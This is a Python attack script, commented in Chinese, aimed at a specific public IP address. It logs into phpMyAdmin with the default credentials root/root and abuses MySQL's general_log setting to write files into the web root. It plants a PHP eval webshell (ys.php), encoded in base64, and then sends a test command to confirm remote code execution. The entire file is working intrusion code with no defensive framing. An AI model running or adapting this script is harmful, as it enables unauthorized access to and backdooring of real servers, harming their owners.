#!/usr/bin/env python3
"""用 phpMyAdmin 内嵌PHP执行: 写 ys.php webshell, 返回字节数确认"""
import urllib.request, http.cookiejar, re, urllib.parse, time

B = "http://81.70.245.25/phpmyadmin/"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.addheaders = [("User-Agent", "Mozilla/5.0")]
html = op.open(B, timeout=10).read().decode("utf-8", "ignore")
tok = re.search(r'name="token" value="([a-f0-9]{32})"', html).group(1)
data = f"pma_username=root&pma_password=root&server=1&token={tok}".encode()
op.open(urllib.request.Request(B + "index.php", data=data), timeout=10).read()

def sql(q):
    qq = urllib.parse.urlencode({"token": tok, "sql_query": q, "ajax_request": "true", "db": "mysql"})
    r = op.open(urllib.request.Request(B + "import.php?" + qq, data=b""), timeout=15)
    return r.read().decode("utf-8", "ignore")

# ys.php = <?php @eval($_POST[x]);?> (25字节)
# base64: PD9waHAgQGV2YWwoJF9QT1NUW3hdKTs/Pg==
sql("SET GLOBAL general_log_file = 'C:/phpStudy/WWW/tys.php'")
sql("SET GLOBAL general_log = 'ON'")
r = sql("SELECT '<?php echo var_export(@file_put_contents(\"C:/phpStudy/WWW/ys.php\", base64_decode(\"PD9waHAgQGV2YWwoJF9QT1NUW3hdKTs/Pg==\")), true);?>'")
sql("SET GLOBAL general_log = 'OFF'")
time.sleep(1)

# 读回结果
import urllib.request as ur
try:
    rr = ur.urlopen(urllib.request.Request("http://81.70.245.25/tys.php", headers={"User-Agent":"Mozilla/5.0"}), timeout=8)
    body = rr.read().decode("utf-8","ignore")
    for line in body.split("\n"):
        if "Query\tSELECT" in line and "file_put" not in line and "general_log" not in line:
            print("写入结果:", line.strip()[line.find("SELECT"):][:80])
except Exception as e:
    print("tys.php ERR:", str(e)[:80])

# 验证 ys.php RCE
try:
    rr = ur.urlopen(urllib.request.Request("http://81.70.245.25/ys.php", data=b"x=echo ALIVE_YS_7788;", headers={"User-Agent":"Mozilla/5.0"}), timeout=8)
    body = rr.read().decode("utf-8","ignore")
    print("ys.php RCE:", "ALIVE_YS_7788" in body, "|", body.strip()[-80:])
except Exception as e:
    print("ys.php ERR:", str(e)[:80])
